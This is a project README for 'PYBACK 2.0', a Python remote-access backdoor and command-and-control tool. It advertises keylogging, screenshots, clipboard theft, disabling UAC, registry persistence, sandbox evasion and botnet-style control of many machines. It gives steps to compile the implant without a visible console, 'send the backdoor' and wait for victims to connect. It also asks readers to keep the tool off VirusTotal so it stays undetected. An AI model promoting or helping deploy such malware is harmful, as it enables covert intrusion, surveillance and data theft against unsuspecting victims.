# PYBACK 2.0  
#### FUD (if you keep it that way) cross-platform backdoor and CNC written in python 2 with post exploitation modules and encrypted communication.  


# Top Features  
.  Cross-platform modules (of course)  
.  Direct shell access ( no need to type extra garbage )  
.  AES encrypted communication  
.  Command and Control center  
.  Can execute commands on all sessions at the same time ( AKA Botnet )  
.  Download/upload files  
.  Detect virtual machine and sandbox  
.  Take screenshots  
.  Dump clipboard  
.  Keylogger  
.  Spawn a separate powershell session  
.  Enable/disable RDP  
.  Enable/disable UAC  
.  Easy session interaction and handling  
.  Windows persistence using registry entries ( more methods will be added )  


# Installation  
a demo of pyback installtion and usage on a linux host is included in the files.  
#### Note: the backdoor should be compiled in a system with the same OS and architecture as the target. DO NOT use wine for windows binary compilation, it wont work.  

### requirements:  
#### python 2 ,version 2.7.15 or later  
#### VCforPython for windows targets, download from  <a href="https://www.microsoft.com/en-us/download/details.aspx?id=44266"> here </a>  
#### to install pyback simply run the setup.py   
`./setup.py`  

# Usage  
#### run the config.py script or edit the lib/setting.py manually.  
`./config.py`  

#### compile the backdoor however you want. i use pyinstaller.  
` pyinstaller --onefile --noconsole backdoor.py`  

#### send the backdoor, start the c2 and wait for connections.  
`./cnc.py`  

# Usage Tips  
.  DO NOT USE QUOTES in path names, for example use `file name` instead of `"file name"` when changing directories with `cd`  
.  If you want to upload a file it should be placed in the same directory as the cnc.py file.  
.  spawn module will spawn a separate shell using powershell for windows, catch it with netcat.  
.  While using the CNC shell your prompt will be like this: `[ CNC ] >>>` and it can run local system commands.  
.  To get a list of all available commands in CNC or backdoor prompt simply type `help`.  
.  ANY COMMAND not included in the help banners will be executed as system shell commands so be carefull with that.  


# To Do    
.  Add more post-exploitation modules  
.  Add a low-level port scanner  


# Changelog  
#### see changelogs for different versions [here](https://github.com/7h3w4lk3r/pyback/blob/master/CHANGELOGS.md)    


# POC  
### we all know that no tool like this will stay as FUD as it is, specially when it gets more attention (hopefully). so do me (and yourself) a favor and make it stay under the radar a little bit longer.  
:heavy_exclamation_mark: DO NOT upload this on VirusTotal or anywhere else, I DID IT FOR YOU :heavy_exclamation_mark:  

### using pyinstaller version 3.1.1:  

![Image description](https://github.com/7h3w4lk3r/pyback/blob/master/image.png) 

# Contact  
Email: bl4ckr4z3r@gmail.com  
